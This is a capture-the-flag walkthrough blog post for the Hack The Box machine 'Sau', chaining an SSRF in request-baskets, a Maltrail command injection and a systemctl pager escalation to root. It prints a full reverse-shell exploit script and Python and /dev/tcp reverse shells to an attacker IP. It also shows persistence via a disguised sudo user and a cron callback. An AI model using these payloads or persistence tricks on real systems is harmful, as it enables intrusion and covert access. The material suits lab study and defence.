+++
tags = ["Box", "HTB", "Easy", "Linux", "CVE-2023–27163", "CVE-2023-26604", "SSRF", "systemctl"]
draft = false
title = "Sau HTB Walkthrough"
author = "bloodstiller"
date = 2024-12-26
+++

## Sau Hack The Box Walkthrough/Writeup: {#sau-hack-the-box-walkthrough-writeup}

-   <https://app.hackthebox.com/machines/Sau>


## How I use variables &amp; Wordlists: {#how-i-use-variables-and-wordlists}

-   **Variables**:
    -   In my commands you are going to see me use `$box`, `$user`, `$hash`, `$domain`, `$pass` often.
        -   I find the easiest way to eliminate type-os &amp; to streamline my process it is easier to store important information in variables &amp; aliases.
            -   `$box` = The IP of the box
            -   `$pass` = Passwords I have access to.
            -   `$user` = current user I am enumerating with.
                -   Depending on where I am in the process this can change if I move laterally.
            -   `$domain` = the domain name e.g. `sugarape.local` or `contoso.local`
            -   `$machine` = the machine name e.g. `DC01`
        -   Why am I telling you this? People of all different levels read these writeups/walkthroughs and I want to make it as easy as possible for people to follow along and take in valuable information.

-   **Wordlists**:
    -   I have symlinks all setup so I can get to my passwords from `~/Wordlists` so if you see me using that path that's why. If you are on Kali and following on, you will need to go to `/usr/share/wordlists`
        -   I also use these additional wordlists:
            -   [Statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)
            -   [SecLists](https://github.com/danielmiessler/SecLists)
            -   [Auto_Wordlists](https://github.com/carlospolop/Auto_Wordlists)


## 1. Enumeration: {#1-dot-enumeration}


### NMAP: {#nmap}


#### Basic Scans: {#basic-scans}

-   **Basic TCP Scan**:
    -   `nmap $box -oA TCPbasicScan`
        ```shell
        kali in HTB/BlogEntriesMade/Sau/scans/nmap  🍣 main  1Gweb/7GiB | 0B/1GiB with /usr/bin/zsh
        🕙 17:04:11 zsh ❯ nmap $box -oA TCPbasicScan
        Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-24 17:04 GMT
        Nmap scan report for 10.129.80.109
        Host is up (0.044s latency).
        Not shown: 997 closed tcp ports (reset)
        PORT      STATE    SERVICE
        22/tcp    open     ssh
        80/tcp    filtered http
        55555/tcp open     unknown

        ```
    -   **Initial thoughts**:
        -   SSH, Web &amp; a strange service on 55555


#### Comprehensive Scans: {#comprehensive-scans}

-   **In depth scan TCP**:

    -   `sudo nmap -p- -sV -sC -O --disable-arp-ping $box -oA FullTCP`

    <!--listend-->

    ```shell
    ali in HTB/BlogEntriesMade/Sau/scans/nmap  🍣 main  1Gweb/7GiB | 0B/1GiB with /usr/bin/zsh
    🕙 17:05:49 zsh ✖  sudo nmap -p- -sV -sC -O --disable-arp-ping $box -oA FullTCP
    [sudo] password for kali:
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-24 17:06 GMT
    Nmap scan report for 10.129.80.109
    Host is up (0.038s latency).
    Not shown: 65531 closed tcp ports (reset)
    PORT      STATE    SERVICE VERSION
    22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey:
    |   3072 aa:88:67:d7:13:3d:08:3a:8a:ce:9d:c4:dd:f3:e1:ed (RSA)
    |   256 ec:2e:b1:05:87:2a:0c:7d:b1:49:87:64:95:dc:8a:21 (ECDSA)
    |_  256 b3:0c:47:fb:a2:f2:12:cc:ce:0b:58:82:0e:50:43:36 (ED25519)
    80/tcp    filtered http
    8338/tcp  filtered unknown
    55555/tcp open     unknown
    | fingerprint-strings:
    |   FourOhFourRequest:
    |     HTTP/1.0 400 Bad Request
    |     Content-Type: text/plain; charset=utf-8
    |     X-Content-Type-Options: nosniff
    |     Date: Tue, 24 Dec 2024 17:06:57 GMT
    |     Content-Length: 75
    |     invalid basket name; the name does not match pattern: ^[wd-_\.]{1,250}$
    |   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie:
    |     HTTP/1.1 400 Bad Request
    |     Content-Type: text/plain; charset=utf-8
    |     Connection: close
    |     Request
    |   GetRequest:
    |     HTTP/1.0 302 Found
    |     Content-Type: text/html; charset=utf-8
    |     Location: /Web
    |     Date: Tue, 24 Dec 2024 17:06:31 GMT
    |     Content-Length: 27
    |     href="/Web">Found</a>.
    |   HTTPOptions:
    |     HTTP/1.0 200 OK
    |     Allow: GET, OPTIONS
    |     Date: Tue, 24 Dec 2024 17:06:32 GMT
    |_    Content-Length: 0
    1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
    SF-Port55555-TCP:V=7.94SVN%I=7%D=12/24%Time=676AEA16%P=x86_64-pc-linux-gnu
    SF:%r(GetRequest,A2,"HTTP/1\.0\x20302\x20Found\r\nContent-Type:\x20text/ht
    SF:ml;\x20charset=utf-8\r\nLocation:\x20/Web\r\nDate:\x20Tue,\x2024\x20Dec
    SF:\x202024\x2017:06:31\x20GMT\r\nContent-Length:\x2027\r\n\r\n<a\x20href=
    SF:\"/Web\">Found</a>\.\n\n")%r(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x
    SF:20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnectio
    SF:n:\x20close\r\n\r\n400\x20Bad\x20Request")%r(HTTPOptions,60,"HTTP/1\.0\
    SF:x20200\x20OK\r\nAllow:\x20GET,\x20OPTIONS\r\nDate:\x20Tue,\x2024\x20Dec
    SF:\x202024\x2017:06:32\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(RTSPReq
    SF:uest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/pl
    SF:ain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Requ
    SF:est")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x2
    SF:0text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad
    SF:\x20Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\
    SF:nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\
    SF:r\n\r\n400\x20Bad\x20Request")%r(TerminalServerCookie,67,"HTTP/1\.1\x20
    SF:400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\
    SF:r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(TLSSessionReq,
    SF:67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\
    SF:x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")
    SF:%r(Kerberos,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20
    SF:text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\
    SF:x20Request")%r(FourOhFourRequest,EA,"HTTP/1\.0\x20400\x20Bad\x20Request
    SF:\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nX-Content-Type-Opt
    SF:ions:\x20nosniff\r\nDate:\x20Tue,\x2024\x20Dec\x202024\x2017:06:57\x20G
    SF:MT\r\nContent-Length:\x2075\r\n\r\ninvalid\x20basket\x20name;\x20the\x2
    SF:0name\x20does\x20not\x20match\x20pattern:\x20\^\[\\w\\d\\-_\\\.\]{1,250
    SF:}\$\n")%r(LPDString,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-T
    SF:ype:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400
    SF:\x20Bad\x20Request")%r(LDAPSearchReq,67,"HTTP/1\.1\x20400\x20Bad\x20Req
    SF:uest\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x2
    SF:0close\r\n\r\n400\x20Bad\x20Request");
    Device type: general purpose
    Running: Linux 5.X
    OS CPE: cpe:/o:linux:linux_kernel:5.0
    OS details: Linux 5.0
    Network Distance: 2 hops
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 114.86 seconds

    ```

    -   **Findings**:
        -   So it's running Ubuntu, there is also a Webserver running `55555`


### SSH `22`: {#ssh-22}

-   Even though SSH is running it's often not worth trying bruteforce due to how slow it is so I will come back to this later.


### Web `80`: {#web-80}

-   **Web Enumeration via Burp Suite**:
    -   When enumerating a Website, always use Burp Suite. This allows you to:
    -   Record all potential injection points.
    -   Capture relevant responses for each request, making it easier to analyze vulnerabilities and track your testing progress.


#### WhatWeb: {#whatweb}

-   Lets run "whatWeb" to see if I can glean some further information:

    -   `whatWeb http://$box | sed 's/, /\n/g'`
    -   +Note+: I use sed to put the output across multiple lines for a nicer output.
    -   {{< figure src="/ox-hugo/2024-12-24-181127_.png" >}}
        -   It fails.

    <!--listend-->

    -   It looks to me like this can't be accessed yet.


### Service `55555`: {#service-55555}


#### WhatWeb: {#whatweb}

-   Lets run "whatWeb" to see if I can glean some further information:
    -   `whatWeb http://$box:55555 | sed 's/, /\n/g'`
    -   {{< figure src="/ox-hugo/2024-12-24-181229_.png" >}}


#### Manually Visiting the page: {#manually-visiting-the-page}

-   When visiting the page I can see it's for a service called request-baskets.
    -   {{< figure src="/ox-hugo/2024-12-24-180441_.png" >}}
    -   Looking at the repo for the project I can see its a "HTTP requests collector to test Webhooks, notifications, REST clients and more &#x2026;"

-   Creating a basket:
    -   I create a basket.
        -   {{< figure src="/ox-hugo/2024-12-24-180605_.png" >}}
    -   I am issued with a token:
        -   {{< figure src="/ox-hugo/2024-12-24-180637_.png" >}}
-   When I open the basket I am treated to this page:
    -   {{< figure src="/ox-hugo/2024-12-24-180718_.png" >}}
-   Clicking the clog in the top right it reveals I can forward our requests to a url of our choosing.
    -   {{< figure src="/ox-hugo/2024-12-24-180734_.png" >}}

-   I stand-up a python server:
    -   `python -m http.server 9000`
-   I put the URL into the box as Ill as `/POC`.
    -   {{< figure src="/ox-hugo/2024-12-24-180833_.png" >}}
    -   I save "Apply" it.

-   I make a request with the supplied url: <http://10.129.80.109:55555/xk7ox7n>

-   I immediately get a hit on Webserver.
    -   {{< figure src="/ox-hugo/2024-12-24-181001_.png" >}}


### Discovering The Host Is Vulnerable To SSRF CVE-2023-27163: {#discovering-the-host-is-vulnerable-to-ssrf-cve-2023-27163}

-   Lets see if I can access the service running on port 80 of the machine, that I could not access before.
    -   I change the forward url to `http://127.0.0.1:80`
        -   {{< figure src="/ox-hugo/2024-12-24-181441_.png" >}}
-   I visit the page but nothing happens.
-   I then enable the below options:
    -   {{< figure src="/ox-hugo/2024-12-24-181552_.png" >}}

-   When I go now I get the following page:
    -   {{< figure src="/ox-hugo/2024-12-24-181633_.png" >}}
    -   looking it appears to be a service called "MalTrail" and it's version 0.53


## 2. Foothold: {#2-dot-foothold}


### Getting A Reverse Shell Using CVE-2023-27163 Exploit: {#getting-a-reverse-shell-using-cve-2023-27163-exploit}

-   I find this exploit for the software MailTrail v 0.53 - <https://github.com/spookier/Maltrail-v0.53-Exploit> it takes advantage of this command injection RCE
    -   <https://www.rapid7.com/db/modules/exploit/unix/http/maltrail_rce/> CVE-2023–27163.
    -   The username parameter is vulnerable to an injection attack.

-   The POC exploit is below.
    -   +Note+: I have added comments to it to explain what is happening.

<!--listend-->

```python
import sys; # import system to take CLI args.
import os; # import OS to directly interact wtih the operating system.
import base64; # import base64 for encoding payload.

# Declare Main Function/Logic
def main():
    # Declare variables
	listening_IP = None
	listening_PORT = None
	target_URL = None

    # Simple if statement that checks if all CLI args are provided, if not it errors our and prints a message.
	if len(sys.argv) != 4:
		print("Error. Needs listening IP, PORT and target URL.")
		return(-1)

    # Takes the CLI args from the user (appends "/login" to the target url)
	listening_IP = sys.argv[1]
	listening_PORT = sys.argv[2]
	target_URL = sys.argv[3] + "/login"

    # Prints a message stating that the exploit is running.
	print("Running exploit on " + str(target_URL))

    # Runs the curl_cmd function with the provided user variables.
	curl_cmd(listening_IP, listening_PORT, target_URL)

# Define the curl_cmd function, which takes 3 arguments. The users IP, the PORT & the target_url.
def curl_cmd(my_ip, my_port, target_url):

    # Define the payload.
    # This is a simple python reverse shell, which imports socket, os & pty.
    # It takes the user provided args listening_IP & listening_PORT and they are passed as my_ip, my_port as f-string args
	payload = f'python3 -c \'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{my_ip}",{my_port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")\''

    # It encodes the payload in base64 format.
	encoded_payload = base64.b64encode(payload.encode()).decode()  # encode the payload in Base64

    # It runs a curl command, and passes the data via the `username` parameter where it echoes out the payload, base64 decrypts it and then passes it for a subshell for execution.
	command = f"curl '{target_url}' --data 'username=;`echo+\"{encoded_payload}\"+|+base64+-d+|+sh`'"
	os.system(command)

if __name__ == "__main__":
  main()
```

-   I start my local listener.
    -   `rlwrap -cAr nc -nvlp 4433`

-   I run the exploit and get a shell.
    -   {{< figure src="/ox-hugo/2024-12-27-071945_.png" >}}

-   Lets get the user flag:
    -   {{< figure src="/ox-hugo/2024-12-27-072035_.png" >}}

-   Now that I have a shell, I will upgrade it so I can have more functionality.
    -   `python3 -c 'import pty; pty.spawn("/bin/bash")'`
    -   {{< figure src="/ox-hugo/2024-12-27-073125_.png" >}}

-   I check what commands I can run with sudo privileges and there is a service, `trail.service` I can run with sudo privileges.
    -   {{< figure src="/ox-hugo/2024-12-27-073318_.png" >}}


## 3. Privilege Escalation: {#3-dot-privilege-escalation}


### Side-quest/rabbit hole: {#side-quest-rabbit-hole}

+Note+: This was a little side quest that I have left in for transparency.

-   Reading the service file I can see it runs the `server.py` file which is in the `/opt/maltrail` folder. Which means if I can edit this file or if I can change the file it executes.
    -   {{< figure src="/ox-hugo/2024-12-27-074416_.png" >}}

-   I tried a lot of ways to get vim working, however no matter how I upgraded my shell it would not work. Luckily I can use built in tools such as `sed` to replace content within the files.
    ```bash
    # Command:
    sed -i 's/[ReplaceThisContent]/[WithThisContent]/' [File]
    ```

    -   It's as simple as that, it's much like find and replace within `vim`. E.G. I can pass flags such as `g` to perform global replacements in the entire file.

-   Let's create a python reverse shell in our home dir.
    ```shell
      echo 'import os,pty,socket;s=socket.socket();s.connect(("10.10.14.18",4242));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/sh")' >> ~/shell.py
    ```

    -   {{< figure src="/ox-hugo/2024-12-27-111346_.png" >}}

-   I can now use `sed` to modify the trail.service to point at our new reverse shell.
    ```bash
    sed -i "s/ExecStart=\/usr\/bin\/python3\ server.py/ExecStart=\/usr\/bin\/python3\ \/home\/puma\/shell.py/g" trail.service
    ```

-   Ill that did not work as I cannot write to the file.
    -   {{< figure src="/ox-hugo/2024-12-27-112258_.png" >}}


### Discovering The Host Is Vulnerable To CVE-2023-26604: {#discovering-the-host-is-vulnerable-to-cve-2023-26604}

-   I put linpeas on the host but do not find anything of note.

-   As this is a box/ctf I can't help but think that the service I can execute as root does have something to do with the privesc path.

-   I check the version of `systemctl` running:
    -   `systemctl --version`
    -   {{< figure src="/ox-hugo/2024-12-27-130732_.png" >}}
    -   I can see it's version:  `systemd 245 (245.4-4ubuntu3.22)`

-   I search for the phrase "systemd 245 (245.4-4ubuntu3.22) privesc" and find the following page: <https://packetstorm.news/files/id/174130>.
    -   Reading the article it appears that when I request the status of a service e.g:
        ```shell
          sudo systemctl status [service]
        ```

        -   It will open the output in a pager, which allows us to execute additional commands and as this is running in the context of the root user if I type `!/bin/sh` I can launch a root shell.
            -   +Note+: It is also possible to run other commands but for the purpose of this we want RCE in the context of the root user.


### Getting A Reverse Shell Using CVE-2023-26604: {#getting-a-reverse-shell-using-cve-2023-26604}

-   I view the output of the `trail.service` as I can run that in the context of root.
    -   `sudo systemctl status trail.service`
    -   With this open I can now run `!/bin/sh` to launch the root terminal.
    -   {{< figure src="/ox-hugo/2024-12-27-131909_.png" >}}

<!--listend-->

-   I get the root flag:
    -   {{< figure src="/ox-hugo/2024-12-27-132049_.png" >}}


## 4. Persistence: {#4-dot-persistence}

-   Now that I have root access I would like to retain it so I will demonstrate two simple persistence techniques.


### Creating a high privileged "service" account for persistence: {#creating-a-high-privileged-service-account-for-persistence}

-   I create an account called "nginx" and give myself root privileges &amp; access to the bash shell. I use this name as it's one you could see on a machine and will raise less suspicion.
    -   `sudo useradd -m -s /bin/bash nginx`
        -   Creates a new user named `nginx`.
        -   `-m`: Creates a home directory for the user.
        -   `-s /bin/bash`: Sets the user's default shell to `/bin/bash`.
        -   {{< figure src="/ox-hugo/2024-12-27-132942_.png" >}}
    -   `sudo usermod -aG sudo nginx`
        -   Adds the `nginx` user to the `sudo` group.
        -   `-a`: Appends the user to the group (avoids overwriting existing groups).
        -   `-G sudo`: Specifies the `sudo` group.

    -   `sudo passwd nginx`
        -   Sets or updates the password for the `nginx` user.
        -   Prompts us to add a new password and confirms it.
        -   {{< figure src="/ox-hugo/2024-12-27-133018_.png" >}}

-   I switch to the newly created user
    -   {{< figure src="/ox-hugo/2024-12-27-133056_.png" >}}

-   I check I have sudo privileges, as expected I do.
    -   {{< figure src="/ox-hugo/2024-12-27-133113_.png" >}}

-   I ensure I can actually read sudo level files by reading `/etc/shadow`
    -   {{< figure src="/ox-hugo/2024-12-27-133145_.png" >}}


### Creating a cron job reverse shell: {#creating-a-cron-job-reverse-shell}

```shell
(crontab -l > .tab ; echo "* * * * * /bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.18/443 0>&1'" >> .tab ; crontab .tab ; rm .tab) > /dev/null 2>&1
```

-   {{< figure src="/ox-hugo/2024-12-27-132407_.png" >}}

-   Let's verify it's in the crontab by running `crontab -l`
    -   {{< figure src="/ox-hugo/2024-12-27-132424_.png" >}}
    -   As I can see it's running.

-   I start my listener and get a connection back after 1 minute.
    -   {{< figure src="/ox-hugo/2024-12-27-132448_.png" >}}

-   +Note+: This is great as a means to call back out to our attack machine, however an interval of every 1 minute is excessive, it would typically be better to set it at longer intervals to re-connect.


## Lessons Learned: {#lessons-learned}


### What did I learn? {#what-did-i-learn}

1.  I actually learned about the systemctl CVE, I was not aware of that before.
2.  This box helped me cement more SSRF learning, I have been grinding some SSRF/Web boxes recently to get better at them.


### What silly mistakes did I make? {#what-silly-mistakes-did-i-make}

1.  Nothing of note this time, which is nice.


## Sign off: {#sign-off}

Remember, folks as always: with great poIr comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!

Until next time, hack the planet!

&#x2013; Bloodstiller

&#x2013; Get in touch bloodstiller at bloodstiller dot com


